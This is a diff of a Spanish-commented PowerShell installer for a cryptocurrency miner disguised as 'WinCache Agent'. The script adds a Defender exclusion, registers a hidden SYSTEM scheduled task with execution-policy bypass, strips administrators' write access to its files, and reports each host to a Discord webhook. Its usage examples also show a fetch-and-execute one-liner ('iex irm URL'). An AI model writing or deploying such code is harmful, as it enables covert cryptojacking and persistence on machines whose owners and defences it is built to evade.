@@ -6,6 +6,8 @@
 .EXAMPLE
     .\Mine.ps1 -Wallet "YOUR_WALLET_ADDRESS" -Pool "us-rvn.2miners.com:6060" -Algo "kawpow" -DiscordWebhook "https://discord.com/api/webhooks/..."
 .EXAMPLE
+    iex "& { $(irm 'URL_DEL_SCRIPT') } -Diagnose"
+.EXAMPLE
     .\Mine.ps1 -Uninstall
 #>
 [CmdletBinding()]
@@ -50,23 +52,21 @@ function Send-DiscordWebhook {
     } catch { return $false }
 }
 
-function Unprotect-Files {
+function Force-Unlock {
     param([string]$Path)
-    if ($Path) {
-        Write-Host '[*] Removiendo protección de archivos (esto puede tardar unos segundos)...'
-        $confirm = if ((Get-WinSystemLocale).Name -match '^es') { 'S' } else { 'Y' }
-        
-        # Intentar tomar posesión y devolver permisos a los archivos específicos
+    if (Test-Path $Path) {
         try {
-            & takeown.exe /f "$Path\WinCache.exe" /a 2>&1 | Out-Null
-            & takeown.exe /f "$Path\WinCache.ps1" /a 2>&1 | Out-Null
-            & icacls.exe "$Path\WinCache.exe" /grant "*S-1-5-32-544:F" /C 2>&1 | Out-Null
-            & icacls.exe "$Path\WinCache.ps1" /grant "*S-1-5-32-544:F" /C 2>&1 | Out-Null
-            & icacls.exe "$Path\WinCache.exe" /remove:d "*S-1-5-32-544" /C 2>&1 | Out-Null
-            & icacls.exe "$Path\WinCache.ps1" /remove:d "*S-1-5-32-544" /C 2>&1 | Out-Null
-        } catch {
-            # Silencioso para evitar que el script muera si la carpeta está muy bloqueada
-        }
+            $confirm = if ((Get-WinSystemLocale).Name -match '^es') { 'S' } else { 'Y' }
+            # Tomar posesión forzosa ignorando errores
+            & takeown.exe /f $Path /r /d $confirm 2>&1 | Out-Null
+            # Devolver Control Total a Administradores y SYSTEM
+            & icacls.exe $Path /grant "*S-1-5-32-544:(OI)(CI)F" /T /C 2>&1 | Out-Null
+            & icacls.exe $Path /grant "*S-1-5-18:(OI)(CI)F" /T /C 2>&1 | Out-Null
+            # Eliminar cualquier regla de denegación
+            & icacls.exe $Path /remove:d "*S-1-5-32-544" /T /C 2>&1 | Out-Null
+            # Restaurar herencia
+            & icacls.exe $Path /inheritance:e /T /C 2>&1 | Out-Null
+        } catch {}
     }
 }
 
@@ -78,7 +78,6 @@ function Protect-Files {
         $filesToProtect = @("$Path\WinCache.exe", "$Path\WinCache.ps1")
         foreach ($file in $filesToProtect) {
             if (Test-Path $file) {
-                # No quitamos la herencia de la carpeta, solo de los archivos
                 & icacls.exe $file /inheritance:r 2>&1 | Out-Null
                 & icacls.exe $file /grant "*S-1-5-18:(F)" 2>&1 | Out-Null
                 & icacls.exe $file /grant "*S-1-5-32-544:(RX)" 2>&1 | Out-Null
@@ -87,17 +86,6 @@ function Protect-Files {
         }
         Write-Host '[+] Archivos bloqueados para administradores.'
     }
-}
-
-function Stop-Safe {
-    Write-Host '[*] Deteniendo instancia anterior de forma segura...'
-    $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
-        Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
-    foreach ($w in $watchers) {
-        Stop-Process -Id $w.ProcessId -Force -ErrorAction SilentlyContinue
-    }
-    Start-Sleep -Seconds 1
-    Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 }
 
 # ---------- test webhook ----------------------------------------------------
@@ -109,29 +97,63 @@ if ($TestWebhook) {
     return
 }
 
-# ---------- diagnose --------------------------------------------------------
+# ---------- diagnose (Seguro para ejecutar sin admin) -----------------------
 if ($Diagnose) {
-    function Section($t) { Write-Host ''; Write-Host "=== $t ===" -ForegroundColor Cyan }
-    function Line($k, $v) { Write-Host ("  {0,-28} {1}" -f $k, $v) }
-
-    Section 'Install path'
-    Line 'Root'        $Root
-    Line 'Exists'      (Test-Path $Root)
-    Line 'WinCache.exe'(Test-Path $ExePath)
-    Line 'WinCache.ps1'(Test-Path $SelfPs)
-    Line 'cache.log'   $LogFile
-
-    Section 'Scheduled Task'
+    Write-Host '=================================================='
+    Write-Host '  DIAGNÓSTICO DEL SISTEMA (WinCache Agent)'
+    Write-Host '=================================================='
+    
+    Write-Host "`n[+] 1. Verificando Tarea Programada..." -ForegroundColor Cyan
     $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
-    if ($task) { Line 'State' $task.State } else { Write-Host '  No hay tarea programada.' -ForegroundColor Yellow }
+    if ($task) { 
+        Write-Host "    Nombre: $($task.TaskName)"
+        Write-Host "    Estado: $($task.State)" 
+    } else { 
+        Write-Host "    [!] No se encontró la tarea programada." -ForegroundColor Yellow 
+    }
 
-    Section 'Processes'
+    Write-Host "`n[+] 2. Verificando Procesos Activos..." -ForegroundColor Cyan
     $miners = Get-Process WinCache -ErrorAction SilentlyContinue
-    if ($miners) { foreach ($m in $miners) { Line "Miner PID $($m.Id)" "started=$($m.StartTime)" } } else { Write-Host '  Miner NO corriendo.' -ForegroundColor Yellow }
+    if ($miners) { 
+        foreach ($m in $miners) { Write-Host "    Miner PID $($m.Id) iniciado a las $($m.StartTime)" } 
+    } else { 
+        Write-Host "    [!] Miner NO está corriendo." -ForegroundColor Yellow 
+    }
+    
+    $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
+    if ($watchers) {
+        foreach ($w in $watchers) { Write-Host "    Watcher PID $($w.ProcessId) (PowerShell -Run)" }
+    } else {
+        Write-Host "    [!] Watcher de PowerShell NO está corriendo." -ForegroundColor Yellow
+    }
 
-    Section 'Last 10 lines of cache.log'
-    if (Test-Path $LogFile) { Get-Content $LogFile -Tail 10 | ForEach-Object { Write-Host "  $_" } } else { Write-Host '  (No existe)' }
-    Write-Host ''
+    Write-Host "`n[+] 3. Verificando Acceso a Archivos..." -ForegroundColor Cyan
+    try {
+        $exists = Test-Path $Root
+        Write-Host "    Carpeta existe: $exists"
+        if ($exists) {
+            $exeExists = Test-Path $ExePath
+            Write-Host "    WinCache.exe existe: $exeExists"
+            $ps1Exists = Test-Path $SelfPs
+            Write-Host "    WinCache.ps1 existe: $ps1Exists"
+        }
+    } catch {
+        Write-Host "    [!] Error al intentar leer la carpeta: $_" -ForegroundColor Red
+        Write-Host "    [!] La carpeta está bloqueada. Usa el script con -Uninstall." -ForegroundColor Red
+    }
+
+    Write-Host "`n[+] 4. Últimas líneas del Log (cache.log)..." -ForegroundColor Cyan
+    try {
+        if (Test-Path $LogFile) { 
+            Get-Content $LogFile -Tail 15 | ForEach-Object { Write-Host "    $_" } 
+        } else { 
+            Write-Host "    [!] El archivo de log no existe o no es accesible." -ForegroundColor Yellow 
+        }
+    } catch {
+        Write-Host "    [!] No se pudo leer el log por permisos." -ForegroundColor Red
+    }
+
+    Write-Host "`n=================================================="
     return
 }
 
@@ -153,8 +175,15 @@ if (-not $Run -and -not $NoElevate) {
     }
 }
 
+# ---------- DESBLOQUEO INMEDIATO (Post-Elevación) ---------------------------
+# Forzamos el desbloqueo de la carpeta antes de hacer cualquier otra cosa
+if (-not $Run) {
+    Write-Host '[*] Asegurando permisos de la carpeta...'
+    Force-Unlock -Path $Root
+}
+
 # ---------- INICIO DE INSTALACIÓN -------------------------------------------
-# 1. CREAR CARPETA Y EXCLUIR EN DEFENDER PRIMERO
+# 1. CREAR CARPETA Y EXCLUIR EN DEFENDER
 foreach ($d in @($Root, $LogDir)) { 
     if (-not (Test-Path $d)) { New-Item -ItemType Directory -Force -Path $d | Out-Null } 
 }
@@ -176,8 +205,12 @@ try {
 
 # 2. DESINSTALACIÓN
 if ($Uninstall) {
-    Unprotect-Files -Path $Root
-    Stop-Safe
+    Write-Host '[*] Deteniendo instancia anterior...'
+    $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
+    foreach ($w in $watchers) { Stop-Process -Id $w.ProcessId -Force -ErrorAction SilentlyContinue }
+    Start-Sleep -Seconds 1
+    Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+    
     Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
     Write-Host '[+] Desinstalado correctamente.'
     return
@@ -285,8 +318,6 @@ if ([string]::IsNullOrWhiteSpace($Worker)) {
 }
 
 # 6. ACTUALIZACIÓN DEL SCRIPT
-Unprotect-Files -Path $Root
-
 if ($scriptPath -and (Test-Path $scriptPath) -and ($scriptPath -ne $SelfPs)) {
     Copy-Item $scriptPath $SelfPs -Force
     Unblock-File $SelfPs -ErrorAction SilentlyContinue
@@ -299,8 +330,7 @@ $head = (Get-Content $SelfPs -TotalCount 1 -ErrorAction SilentlyContinue)
 if ($head -notmatch '^#Requires') { Remove-Item $SelfPs -Force; throw "Archivo descargado no es válido." }
 
 # 7. CREACIÓN DE LA TAREA PROGRAMADA
-Write-Host '[*] Actualizando instalación (deteniendo versión anterior)...'
-Stop-Safe
+Write-Host '[*] Registrando Tarea Programada...'
 Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
 
 $argList = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$SelfPs`" -Wallet `"$Wallet`" -Pool `"$Pool`" -Algo `"$Algo`" -Worker `"$Worker`""
@@ -313,21 +343,24 @@ $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoi
 $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
 Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Description "WinCache Agent" | Out-Null
-Write-Host "[+] Tarea programada actualizada."
 
-# 8. LANZAR EL WATCHER
-$p = $null
-if ($Foreground) {
-    & $SelfPs -Run -NoElevate -Wallet $Wallet -Pool $Pool -Algo $Algo -Worker $Worker -DiscordWebhook $DiscordWebhook
-} else {
-    $p = Start-Process -FilePath 'powershell.exe' -ArgumentList $argList -WindowStyle Hidden -PassThru
-    Write-Host "[+] Watcher iniciado en segundo plano (PID: $($p.Id))"
-}
+# 8. LANZAR EL WATCHER (Usando el Task Scheduler para consistencia)
+Write-Host "[+] Iniciando Tarea Programada..."
+Start-ScheduledTask -TaskName $TaskName
+
+# Dar tiempo al Watcher de iniciar y leer el script antes de bloquear los archivos
+Start-Sleep -Seconds 3
 
 # 9. APLICAR PROTECCIÓN DE ARCHIVOS AL FINAL
 Protect-Files -Path $Root
 
 if ($DiscordWebhook) {
-    $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`nEstado: Actualizado e Iniciado (Archivos Protegidos)."
-    Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Actualización Exitosa" -Message $msg -Color 3066993 | Out-Null
+    $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`nEstado: Tarea Instalada, Iniciada y Archivos Protegidos."
+    Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Instalación Exitosa" -Message $msg -Color 3066993 | Out-Null
 }
+
+Write-Host ''
+Write-Host '=================================================='
+Write-Host '  Instalación completa y protegida.'
+Write-Host '  Usa: iex "& { $(irm ...) } -Diagnose" para comprobar el estado.'
+Write-Host '=================================================='
